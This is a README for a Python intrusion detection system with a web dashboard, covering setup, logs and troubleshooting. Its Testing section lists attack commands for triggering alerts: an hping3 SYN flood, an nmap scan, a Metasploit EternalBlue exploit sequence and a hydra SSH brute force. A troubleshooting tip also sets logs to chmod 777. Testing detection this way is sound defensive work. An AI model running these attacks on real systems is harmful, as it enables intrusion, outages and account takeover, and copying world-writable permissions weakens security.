## INTRUSION DETECTION SYSTEM

## Prerequisites
- Python 3.8+
- Root permissions for packet capture
- Required tools:
sudo apt update
sudo apt install python3 python3-pip python3-venv net-tools

## Setup
cd ids_project
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
Edit network interface in config/settings.py:
INTERFACE = "eth0" # or wlan0, ens33, etc.

## Running the IDS
sudo bash scripts/run_ids.sh
> The dashboard will be available at: http://localhost:5000
## Dashboard Features
- Live Alerts (via SocketIO)
- Alert History
- Filters: protocol, start_date, end_date
- Pagination (50 alerts per page)
- Log Viewer
- View last 200 lines of any .log file from /logs/
- Export Alerts to CSV
- Applies same filters as /history
- Downloads via /export_csv


## Testing
- **HTTP Flood**: `sudo hping3 -S -p 80 --flood <target_ip>`
- **Port Scan**: `nmap <target_ip>`
- **SMB Attack**: Use Metasploit:
  ```
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <target_ip>
  set LHOST <kali_ip>
  exploit
  ```
- **SSH Brute Force**: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>`

## Logs
- Application: `logs/app.log`
- Database: `logs/db.log`
- Packet capture: `logs/ids.log`
- Parser: `logs/parser.log`
- Rules: `logs/rules.log`
- Geolocation: `logs/geo.log`
- Resolver: `logs/resolver.log`
- Detector: `logs/detector.log`
- Alert Generator: `logs/alert_generator.log`
- Runtime: `logs/run.log`

## Troubleshooting
- **No dashboard**: Check `logs/app.log` and `logs/run.log`
- **No alerts**: Verify interface (`ifconfig`), check `logs/ids.log` and `logs/parser.log`, use `tcpdump -i eth0`
- **Dependency errors**: Run `sudo apt install python3-pip`
- **Permission errors**: Ensure `sudo`, verify `chmod -R 777 logs/`
